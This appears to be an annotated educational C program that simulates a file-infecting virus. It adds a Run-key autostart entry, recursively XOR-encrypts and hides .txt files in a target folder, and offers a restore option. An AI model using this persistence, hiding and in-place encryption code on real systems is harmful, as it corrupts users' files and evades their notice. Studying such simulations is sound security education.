/* virus_simulator.c - 模擬病毒感染與複製 */
#include <stdio.h>  // 輸入輸出：printf()、fopen() 等。
#include <stdlib.h> // 標準函式庫：malloc()、exit() 等。
#include <string.h> // 字串處理：strstr()、strcmp() 等。 
#include <dirent.h> // 操作資料夾（目錄）：opendir()、readdir() 等。
#include <windows.h> // Windows API (註冊表與檔案屬性) 
#include <sys/stat.h> // 取得檔案資訊：stat() 判斷是不是資料夾。
#include "virus_utils.h" // 自定義標頭檔  

// 持久化 Persistence : 模擬病毒在開機時自動執行  
void set_persistence()
{
	char exe_path[MAX_PATH];
	
	// 取得當前正執行的 .exe 檔完整路徑 
	GetModuleFileName(NULL, exe_path, MAX_PATH);
	
	HKEY hkey;
	
	// 開啟當前使用者的啟動註冊表路徑 
	// 電腦\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 
	if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
	0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS)
	{
		// 在註冊表中建立一個  "MalwareSimProject" 的鍵值，內容為病毒程式路徑  
		RegSetValueEx(hkey, "MalwareSimProject", 0, REG_SZ, (const BYTE*)exe_path, strlen(exe_path) + 1);
		RegCloseKey(hkey); // 關閉註冊表控制權 
		printf("[模擬病毒 - 持久化] 以寫入啟動項，模擬開機自啟動...\n"); 
	}
}

// 防禦規避(隱身) Defense Evasion : 模擬病毒修改檔案屬性躲避使用者發覺 
void hide_file(const char *path)
{
	// FILE_ATTRIBUTE_HIDDEN: 隱藏屬性  
	// FILE_ATTRIBUTE_SYSTEM: 標記為系統檔案 (使其更難被發現) 
	if (SetFileAttributes(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM))
	{
		printf("[模擬病毒 - 隱蔽性] 檔案已被設為隱藏和系統屬性。\n");
	}
}

// 原地感染 Infection : 模擬直接破壞檔案內容 
void infect_file_inplace(const char *path)
{
	// 用 "rb+" 模式以二進位讀取模式開啟現有檔案，不建立新檔，原地修改  
	FILE *fp = fopen(path, "rb+");
	if (!fp) return;
	
	int c;
	// 逐個位元組讀取檔案內容  
	while ((c = fgetc(fp)) != EOF)
	{
		// fseek 指標往回移 1 個位置，準備覆蓋剛讀取的位元組  
		fseek(fp, -1, SEEK_CUR);
		
		// 執行 XOR 運算 (使用金鑰 0xDC) 並寫回  
		fputc(c ^ 0xDC, fp);
		
		// fflush 強制把緩衝區資料寫入磁碟，確保原地覆蓋達成  
		fflush(fp);
	}
	
	// 在檔尾寫入病毒特徵碼，避免重複感染  
	fprintf(fp, "\n%s\n", VIRUS_SIGNATURE);
	fclose(fp);
	
	// 感染完後，把檔案隱藏起來  
	hide_file(path);
	printf("完成原地 XOR 感染 %s\n", path);
} 

// 還原病毒的影響 (XOR 解密 + 取消隱藏) 為方便後續模組演示  
void restore_virus_effects(const char *path)
{
	DIR *dir = opendir(path);
	if (!dir) return;
	
	struct dirent *entry;
	char fullpath[1024];
	struct stat st;
	
	while((entry = readdir(dir)) != NULL)
	{
		if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
		snprintf(fullpath, sizeof(fullpath), "%s%s%s", path, PATH_SEP, entry->d_name);
		if (stat(fullpath, &st) != 0) continue;
		
		if (S_ISDIR(st.st_mode))
		{
			restore_virus_effects(fullpath);
		}
		else
		{
			// 只要檔案內含有病毒簽名，就執行還原  
			if (is_infected(fullpath))
			{
				clean_virus_signature(fullpath);
				printf("[還原達成] 內容已解密、特徵碼已移除、屬性已恢復: %s\n",entry->d_name);
			}
		}
	}
	closedir(dir);
}

// 遞迴掃描與感染 
// *path 指向 "."，也會傳下去給 *original_path 等 
void scan_and_infect(const char *path) 		// const 是保護措施，表示函數不會修改你傳進來的字串 
{
											// dir，指標變數名稱，記錄了某個 DIR 結構體的位置。*dir，解開這個指標，就是 DIR 結構體本身的內容  
	DIR *dir = opendir(path);				// opendir() 的參數是你想打開的資料夾名字， 回傳值是 DIR *，是指向系統建立的目錄控制結構的指標  

	if(!dir)								// 如果沒成功打開資料夾，dir 會是 NULL，!NULL 是 true
	{
		perror("無法開啟目前資料夾"); 		// 顯示系統錯誤原因，且印出字串  
		return; 							// 在 void 函數中，直接結束不回傳東西  
	}
	
	struct dirent *entry;               	// entry 是一個指向 dirent 結構的指標， struct dirent 是系統定義的結構，裡面有一個成員 d_name[] 是目前掃描到的檔案/資料夾名稱。 
	char fullpath[1024];                 	// 用來存「完整路徑字串」的，例如 ./MyFolder/file.txt 
	struct stat st;							// stat 是系統結構，裡面有很多關於檔案的資訊，st 自定義的一個 stat 結構變數
	
	while((entry = readdir(dir)) != NULL)   // 每次讀取一個檔案/資料夾，放到 entry 裡，直到沒東西（NULL）
	{
		// 比對兩個字串是否相同， 相同回傳 0， "." 是「目前資料夾」、".." 是「上一層資料夾」，這段是排除 "." 跟 ".." 避免無限迴圈遞迴 
		if(strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name,"..") == 0)
		{
			continue;
		}
		// 把格式化的文字寫進一個字串裡， 寫進 fullpath 陣列裡，path = "."，entry->d_name = "abc.txt" ，fullpath = "./abc.txt" 
		snprintf(fullpath, sizeof(fullpath), "%s%s%s", path, PATH_SEP, entry->d_name);
		if (stat(fullpath,&st) != 0) continue; 	// stat() 函數會從該路徑讀取資訊，把結果存進 st，st 裡就會有這是資料夾嗎？檔案多大？建立時間等等       			
						
		if(S_ISDIR(st.st_mode))				// st.st_mode 是 stat 裡的一個欄位，存的是「檔案的型別和權限」， S_ISDIR() 是個宏（macro），用來判斷這是不是資料夾。
		{
			// 把 fullpath 再帶進來，再跑一層掃描，一層層往資料夾裡鑽  
			scan_and_infect(fullpath);
		}
		// strstr(a, b) 是找 a 裡有沒有 b，這是找檔名裡有沒有 .txt 
		else if(strstr(entry->d_name, ".txt") != NULL)
		{
			if(!is_infected(fullpath)) 		// 如果沒被感染（傳回 0），取反變成 true
			{
				printf("[執行感染]發現目標 : %s ...\n", fullpath);
				infect_file_inplace(fullpath); // 因未感染，把 fullpath 當引數帶入給函數 infect_file_inplace 去感染  
			}
			else
			{
				printf("[跳過]目標已感染 : %s \n", fullpath);
			}
		}	
	}
	
	closedir(dir);							// 關閉你之前打開的資源，避免記憶體外洩 

}


void run_virus_simulator()
{
	int v_choice;
	printf("\n 病毒模組選單 \n");
	printf("1. 選擇執行病毒攻擊 (XOR 加密 + 隱藏 + 持久化)\n");
	printf("2. 選擇解除病毒影響 (還原檔案為接續演示)\n");
	printf("請選擇 : ");
	scanf("%d", &v_choice);
	
	switch (v_choice)
	{
		case 1:
			set_persistence();
			scan_and_infect(TARGET_FOLDER);
			printf("\n[完成] 模擬感染結束，目標檔案已被加密感染並隱藏。\n");
			break;
		case 2:
			restore_virus_effects(TARGET_FOLDER);
			printf("\n[完成] 檔案已恢復可後續演示狀態。\n");
			break;
		default:
			printf("無效選項。\n");
			break;		
	}
}

